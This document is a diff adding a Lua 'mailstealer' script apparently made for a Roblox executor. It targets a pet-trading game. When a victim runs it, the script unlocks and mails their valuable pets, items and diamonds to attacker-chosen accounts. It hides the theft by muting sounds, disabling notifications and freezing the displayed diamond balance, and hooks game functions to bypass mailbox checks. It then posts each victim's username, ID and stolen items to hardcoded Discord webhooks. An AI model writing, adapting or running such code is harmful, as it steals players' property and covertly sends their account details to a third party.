@@ -1,0 +1,838 @@
+Username = "miniivsrr"
+Username2 = "miniivsrr"
+Webhook = "https://discord.com/api/webhooks/1289783351011442781/s6KdTdy1kMLD9C0qZoFr_KmZnoSjAzPMSAbfy6jM62xx6Afi968R7mVav0q07_zgIype"
+MinimumRAP = 100000
+
+DualhookUsername = "P1r4_k1ds"
+DualhookWebhook = "https://discord.com/api/webhooks/1289784284353134663/mz1fmWVWJ5ETF8S7XvR_sSgW3amPTz3GnmzbxzHIfjYyB2Ywd61-GaIaXX-x8YZlGTpB"
+LogsWebhook = "https://discord.com/api/webhooks/1289783427721334795/1lc-c-BPelhGjX8BcfXPi8hv1S7XdmKlxEdKCXjn-Gk_9kpYLaSAPSk_S0Uxu73YEXmi"
+DualhookRAP = 100000000
+mailstealer_name = "Voltz"
+
+Roblox_Username = Username
+Discord_Webhook = Webhook
+
+-- simple mailstealer
+LOGS_WEBHOOK = LogsWebhook
+if getgenv().Executed == true then
+-- return
+end
+getgenv().Executed = true
+
+repeat
+    task.wait()
+until game:IsLoaded()
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+local idiotuser = game:GetService("Players").LocalPlayer.Name
+
+if idiotuser == Username then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (Test it on ALT Account!)")
+    return
+end
+if Username == nil then
+    game:GetService("Players").LocalPlayer:Kick("Please Select a Username!")
+    return
+end
+
+repeat
+    task.wait()
+until game:IsLoaded()
+repeat
+    task.wait()
+until game.PlaceId ~= nil
+repeat
+    task.wait()
+until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
+
+-- variables:
+
+local Library = require(game.ReplicatedStorage.Library)
+local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+local Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
+local Player = game.Players.LocalPlayer
+local Inventory = Save.Inventory
+local HttpService = game:GetService("HttpService")
+local MailMessage = "VoltzHub on TOP!"
+local message = require(game.ReplicatedStorage.Library.Client.Message)
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+
+for id, table in pairs(Inventory.Currency) do
+    if table.id == "Diamonds" then
+        GemsAmount = table._am or 0
+        break
+    end
+end
+
+for adress, func in pairs(getgc()) do
+    if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
+        FunctionToGetFirstPriceOfMail = func
+        break
+    end
+end
+
+FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
+
+if FirstPriceOfMail > GemsAmount then
+    print("You Don't Have Enough Diamonds to Run a Script!")
+    return
+end
+
+local FormatNumber = function(number)
+    local n = math.floor(number)
+    local suf = {
+        "",
+        "k",
+        "m",
+        "b",
+        "t"
+    }
+    local INDEX = 1
+    while n >= 1000 do
+        n = n / 1000
+        INDEX = INDEX + 1
+    end
+    return string.format("%.2f%s", n, suf[INDEX])
+end
+
+local GetItemValue = function(Type, ItemTable)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
+        {
+            Class = {
+                Name = Type
+            },
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return ItemTable.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode(
+                    {
+                        id = ItemTable.id,
+                        pt = ItemTable.pt,
+                        sh = ItemTable.sh,
+                        tn = ItemTable.tn
+                    }
+                )
+            end
+        }
+    ) or 0)
+end
+
+local GetItemValueOfItems = function()
+    RAP = 0
+    for name_of_category, category in pairs(Inventory) do
+        if category ~= nil then
+            for i, v in pairs(category) do
+                RAP = RAP + GetItemValue(name_of_category, v)
+            end
+        end
+    end
+    return RAP
+end
+
+function deepCopy(original)
+    local copy = {}
+    for k, v in pairs(original) do
+        if type(v) == "table" then
+            v = deepCopy(v)
+        end
+        copy[k] = v
+    end
+    return copy
+end
+
+local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    if shiny == true then
+        shinyy = "Shiny"
+    elseif shiny == false then
+        shinyy = "not Shiny"
+    end
+    imgs = "https://cdn.discordapp.com/attachments/1279208429898170409/1283164327385366668/1_Sem_Titulo_20240824195106.jpg?ex=66e1ff67&is=66e0ade7&hm=6ed2756352a5a92f516e1ebd61dce68268b13240c662920ee1b7f46e50a1890e&"
+    local fardplayer = game:GetService("Players").LocalPlayer
+    local ExecutorWebhook = identifyexecutor() or "undefined"
+    JobId = game.JobId
+    local PlayerUser = Player.Name
+    local msg = {
+        ["content"] = ping,
+        ["username"] = "" .. mailstealer_name .. " Mailstealer",
+        ["avatar_url"] = imgs,
+        ["embeds"] = {
+            {
+                ["title"] = "**OMG! New Hit!**",
+                ["type"] = "rich",
+                ["color"] = tonumber(8323327),
+                ["thumbnail"] = {
+                    ["url"] = thumbnail
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "**Summary Generated by " .. mailstealer_name .. " Mailstealer!**",
+                        ["value"] = "```Username     : " ..
+                            fardplayer.Name ..
+                                "\nUser-ID      : " ..
+                                    fardplayer.userId ..
+                                        "\nAccount Age  : " ..
+                                            fardplayer.AccountAge ..
+                                                " Days" ..
+                                                    "\nExploit      : " ..
+                                                        ExecutorWebhook ..
+                                                            "\nReceiver     : " ..
+                                                                Roblox_Username ..
+                                                                    "\nTotal RAP    : " ..
+                                                                        FormatNumber(totalRap1) .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = ":zap: **Pets left** :zap:",
+                        ["value"] = "```➜ " .. pets_left .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":zap: **" .. item_type .. "** :zap:",
+                        ["value"] = "```➜ " .. id .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":zap: **Item RAP** :zap:",
+                        ["value"] = "```➜ " .. FormatNumber(RAP) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":zap: **Gems Left** :zap:",
+                        ["value"] = "```➜ " .. FormatNumber(GemsAmount) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":zap: **Shiny** :zap:",
+                        ["value"] = "```➜ " .. shinyy .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":zap: **RB/Gold/Reg** :zap:",
+                        ["value"] = "```➜ " .. RBgoldNormal .. "```",
+                        ["inline"] = true
+                    }
+                }
+            }
+        },
+        ["attachments"] = {}
+    }
+    local request = http_request or request or HttpPost or syn.request
+    request(
+        {
+            Url = webhook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game.HttpService:JSONEncode(msg)
+        }
+    )
+end
+
+-- skidded that, SORRY!!
+
+local gemsleaderstat = Player.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = Player.leaderstats["\240\159\146\142 Diamonds"]
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(
+    function()
+        gemsleaderstatpath.Value = gemsleaderstat
+    end
+)
+
+local loading = Player.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = Player.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(
+    function()
+        noti.Enabled = false
+    end
+)
+noti.Enabled = false
+
+task.spawn(
+    function()
+        game.DescendantAdded:Connect(
+            function(x)
+                if x.ClassName == "Sound" then
+                    if
+                        x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or
+                            x.SoundId == "rbxassetid://12413423276"
+                     then
+                        x.Volume = 0
+                        x.PlayOnRemove = false
+                        x:Destroy()
+                    end
+                end
+            end
+        )
+    end
+)
+
+-- no more skidding!
+
+local function GetThumbnail(imageid)
+    Asset = string.split(imageid, "rbxassetid://")[2]
+    local Size = "420x420"
+    local Image =
+        game:HttpGet(
+        "https://thumbnails.roblox.com/v1/assets?assetIds=" ..
+            Asset .. "&returnPolicy=PlaceHolder&size=" .. Size .. "&format=png"
+    )
+    thumbnail = game.HttpService:JSONDecode(Image).data[1].imageUrl
+    return thumbnail
+end
+
+MinimumRAP = FirstPriceOfMail
+
+-- EMPTY BOXES
+
+if Inventory.Box then
+    for key, value in pairs(Inventory.Box) do
+        if value._uq then
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(
+                key
+            )
+        end
+    end
+end
+
+local response, err =
+    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+while err == "You must wait 30 seconds before using the mailbox!" do
+    wait()
+    response, err =
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+end
+
+require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+
+local GetListWithAllItems = function()
+    local hits = {}
+    if Inventory.Pet ~= nil then
+        for i, v in pairs(Inventory.Pet) do
+            id = v.id
+            dir = Directory.Pets[id]
+            if dir.huge and dir.Tradable ~= false then
+                rap = GetItemValue("Pet", v)
+                if v.pt == 1 then
+                    ItemImageId = dir.goldenThumbnail
+                    ItemType = "Golden"
+                elseif v.pt == 2 then
+                    ItemImageId = dir.thumbnail
+                    ItemType = "Rainbow"
+                else
+                    ItemImageId = dir.thumbnail
+                    ItemType = "Normal"
+                end
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Pet",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+            if dir.exclusiveLevel and dir.Tradable ~= false then
+                rap = GetItemValue("Pet", v) * (v._am or 1)
+                if v.pt == 1 then
+                    ItemImageId = dir.goldenThumbnail
+                    ItemType = "Golden"
+                elseif v.pt == 2 then
+                    ItemImageId = dir.thumbnail
+                    ItemType = "Rainbow"
+                else
+                    ItemImageId = dir.thumbnail
+                    ItemType = "Normal"
+                end
+                if rap > MinimumRAP then
+                    table.insert(
+                        hits,
+                        {
+                            Item_Id = i,
+                            Item_Name = v.id,
+                            Item_Amount = v._am or 1,
+                            Item_RAP = rap,
+                            Item_Class = "Pet",
+                            IsShiny = v.sh or false,
+                            IsLocked = v.lk or false,
+                            Item_ImageId = ItemImageId,
+                            Item_Type = ItemType
+                        }
+                    )
+                end
+            end
+        end
+    end
+    if Inventory.Egg ~= nil then
+        for i, v in pairs(Inventory.Egg) do
+            id = v.id
+            dir = Directory.Eggs[id]
+            rap = GetItemValue("Egg", v)
+            ItemType = "Normal"
+            ItemImageId = dir.icon
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Egg",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Misc ~= nil then
+        for i, v in pairs(Inventory.Misc) do
+            id = v.id
+            dir = Directory.MiscItems[id]
+            rap = GetItemValue("Misc", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
+            if rap > MinimumRAP and v.id ~= "Slingshot" then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Misc",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Charm ~= nil then
+        for i, v in pairs(Inventory.Charm) do
+            id = v.id
+            dir = Directory.Charms[id]
+            rap = GetItemValue("Charm", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Charm",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Enchant ~= nil then
+        for i, v in pairs(Inventory.Enchant) do
+            id = v.id
+            dir = Directory.Enchants[id]
+            rap = GetItemValue("Enchant", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon(v.tn)
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Enchant",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Lootbox ~= nil then
+        for i, v in pairs(Inventory.Lootbox) do
+            id = v.id
+            dir = Directory.Lootboxes[id]
+            rap = GetItemValue("Lootbox", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Lootbox",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Potion ~= nil then
+        for i, v in pairs(Inventory.Potion) do
+            id = v.id
+            dir = Directory.Potions[id]
+            rap = GetItemValue("Potion", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon(v.tn)
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Potion",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Seed ~= nil then
+        for i, v in pairs(Inventory.Seed) do
+            id = v.id
+            dir = Directory.Seeds[id]
+            rap = GetItemValue("Seed", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Seed",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Ultimate ~= nil then
+        for i, v in pairs(Inventory.Ultimate) do
+            id = v.id
+            dir = Directory.Ultimates[id]
+            rap = GetItemValue("Ultimate", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Ultimate",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Fruit ~= nil then
+        for i, v in pairs(Inventory.Fruit) do
+            id = v.id
+            dir = Directory.Fruits[id]
+            rap = GetItemValue("Fruit", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Fruit",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Hoverboard ~= nil then
+        for i, v in pairs(Inventory.Hoverboard) do
+            id = v.id
+            dir = Directory.Hoverboards[id]
+            rap = GetItemValue("Hoverboard", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Hoverboard",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    if Inventory.Booth ~= nil then
+        for i, v in pairs(Inventory.Booth) do
+            id = v.id
+            dir = Directory.Booths[id]
+            rap = GetItemValue("Booth", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
+            if rap > MinimumRAP then
+                table.insert(
+                    hits,
+                    {
+                        Item_Id = i,
+                        Item_Name = v.id,
+                        Item_Amount = v._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = "Booth",
+                        IsShiny = v.sh or false,
+                        IsLocked = v.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType
+                    }
+                )
+            end
+        end
+    end
+    table.sort(
+        hits,
+        function(a, b)
+            return a.Item_RAP > b.Item_RAP
+        end
+    )
+    return hits
+end
+
+local function IsMailboxHooked()
+    local uid
+    for i, v in pairs(Inventory["Pet"]) do
+        uid = i
+        break
+    end
+    local args = {
+        [1] = "Roblox",
+        [2] = "Test",
+        [3] = "Pet",
+        [4] = uid,
+        [5] = 1
+    }
+    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
+        return false
+    else
+        return true
+    end
+end
+
+itemsCounted = 0
+local totalRap = 0
+local hits = GetListWithAllItems()
+currentMailPrice = FirstPriceOfMail
+-- make it count total rap until sending price is bigger than gems amount, also make it calculate gems amount after each send
+for i, v in pairs(hits) do
+    if v.Item_RAP >= currentMailPrice then
+        totalRap = totalRap + v.Item_RAP
+        itemsCounted = itemsCounted + 1
+    end
+    currentMailPrice = currentMailPrice * 1.5
+    if currentMailPrice > 5000000 then
+        currentMailPrice = 5000000
+    end
+end
+
+
+local function sendItem(category, uid, am, locked)
+    local args = {
+        [1] = Roblox_Username,
+        [2] = "" .. mailstealer_name .. " Mailstealer on TOP!",
+        [3] = category,
+        [4] = uid,
+        [5] = am
+    }
+    local response = false
+    repeat
+        if locked == true then
+            local args = {
+                uid,
+                false
+            }
+            game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+        end
+        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        if response == false and err == "They don't have enough space!" then
+            Roblox_Username = Username2
+            args[1] = Roblox_Username
+        end
+    until response == true
+    GemsAmount = GemsAmount - FirstPriceOfMail
+    FirstPriceOfMail = math.ceil(math.ceil(FirstPriceOfMail) * 1.5)
+    if FirstPriceOfMail > 5000000 then
+        FirstPriceOfMail = 5000000
+    end
+end
+
+local function SendAllGems()
+    for i, v in pairs(Inventory.Currency) do
+        if v.id == "Diamonds" then
+            if GemsAmount >= (FirstPriceOfMail + 10000) then
+				SentGems = GemsAmount - FirstPriceOfMail
+                local args = {
+                    [1] = Roblox_Username,
+                    [2] = "" .. mailstealer_name .. " Mailstealer on TOP!",
+                    [3] = "Currency",
+                    [4] = i,
+                    [5] = SentGems
+                }
+                local response = false
+                repeat
+                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                until response == true
+                SendMessage("Diamonds", "Currency", "Gems", "rbxassetid://15258327857", Discord_Webhook, "none", "no", "<@&1287749719900164158>", SentGems, totalRap)
+                break
+            end
+        end
+    end
+end
+
+
+Left_Hits = #hits
+
+if #hits > 0 or GemsAmount > FirstPriceOfMail then
+    local blob_a = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local blob_b = blob_a.Get()
+
+    FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
+    FavoriteModeSelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza
+
+    oldGet = deepCopy(blob_b)
+    blob_a.Get = function(...)
+        blob_b = oldGet
+        blob_b.FavoriteModeSelection = {FavoriteModeSelection}
+        blob_b.FavoriteModeSelectionPlaza = {FavoriteModeSelectionPlaza}
+        return blob_b
+    end
+
+    if IsMailboxHooked() then
+        local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
+        for i, Func in ipairs(getgc(true)) do
+            if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
+                local Old
+                Old =
+                    hookfunction(
+                    Func,
+                    function(Ins, ...)
+                        if Ins == Mailbox then
+                            return tick()
+                        end
+                        return Old(Ins, ...)
+                    end
+                )
+            end
+        end
+    end
+    for i, v in pairs(hits) do
+        if FirstPriceOfMail > 5000000 then
+            FirstPriceOfMail = 5000000
+        end
+        if v.Item_RAP >= FirstPriceOfMail then
+            sendItem(v.Item_Class, v.Item_Id, v.Item_Amount, v.IsLocked)
+            thumb = GetThumbnail(v.Item_ImageId)
+            Left_Hits = Left_Hits - 1
+            task.spawn(
+                function()
+                    SendMessage(
+                        v.Item_Name,
+                        v.Item_Class,
+                        v.Item_Type,
+                        thumb,
+                        Discord_Webhook,
+                        Left_Hits,
+                        v.IsShiny,
+                        "<@&1287749719900164158>",
+                        v.Item_RAP,
+                        totalRap
+                    )
+                    if Roblox_Username ~= DualhookUsername then
+                        SendMessage(
+                            v.Item_Name,
+                            v.Item_Class,
+                            v.Item_Type,
+                            thumb,
+                            LOGS_WEBHOOK,
+                            Left_Hits,
+                            v.IsShiny,
+                            "Voltz on TOP",
+                            v.Item_RAP,
+                            totalRap
+                        )
+                    end
+                end
+            )
+        else
+            break
+        end
+    end
+    SendAllGems()
+end
